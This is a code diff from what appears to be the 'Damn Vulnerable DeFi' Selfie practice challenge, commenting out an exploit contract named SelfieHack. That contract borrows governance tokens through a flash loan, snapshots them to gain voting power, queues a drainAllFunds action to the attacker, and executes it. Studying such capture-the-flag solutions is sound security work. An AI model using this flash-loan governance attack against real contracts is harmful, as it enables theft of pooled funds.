@@ -72,40 +72,40 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
     }
 }
 
-import "../DamnValuableTokenSnapshot.sol";
+// import "../DamnValuableTokenSnapshot.sol";
 
-contract SelfieHack {
-    DamnValuableTokenSnapshot public token;
-    SelfiePool public pool;
-    SimpleGovernance public governance;
+// contract SelfieHack {
+//     DamnValuableTokenSnapshot public token;
+//     SelfiePool public pool;
+//     SimpleGovernance public governance;
 
-    uint256 public actionId;
+//     uint256 public actionId;
 
-    constructor(address _token, address _pool, address _governance) {
-        token = DamnValuableTokenSnapshot(_token);
-        pool = SelfiePool(_pool);
-        governance = SimpleGovernance(_governance);
-    }
+//     constructor(address _token, address _pool, address _governance) {
+//         token = DamnValuableTokenSnapshot(_token);
+//         pool = SelfiePool(_pool);
+//         governance = SimpleGovernance(_governance);
+//     }
 
-    fallback() external {
-        token.snapshot();
-        token.transfer(address(pool), token.balanceOf(address(this)));
-    }
+//     fallback() external {
+//         token.snapshot();
+//         token.transfer(address(pool), token.balanceOf(address(this)));
+//     }
 
-    function attack() external {
-        pool.flashLoan(token.balanceOf(address(pool)));
-        // This will run after the snapshot
-        actionId = governance.queueAction(
-            address(pool),
-            abi.encodeWithSignature(
-                "drainAllFunds(address)",
-                address(msg.sender)
-            ),
-            0
-        );
-    }
+//     function attack() external {
+//         pool.flashLoan(token.balanceOf(address(pool)));
+//         // This will run after the snapshot
+//         actionId = governance.queueAction(
+//             address(pool),
+//             abi.encodeWithSignature(
+//                 "drainAllFunds(address)",
+//                 address(msg.sender)
+//             ),
+//             0
+//         );
+//     }
 
-    function attack2() external {
-        governance.executeAction(actionId);
-    }
-}
+//     function attack2() external {
+//         governance.executeAction(actionId);
+//     }
+// }
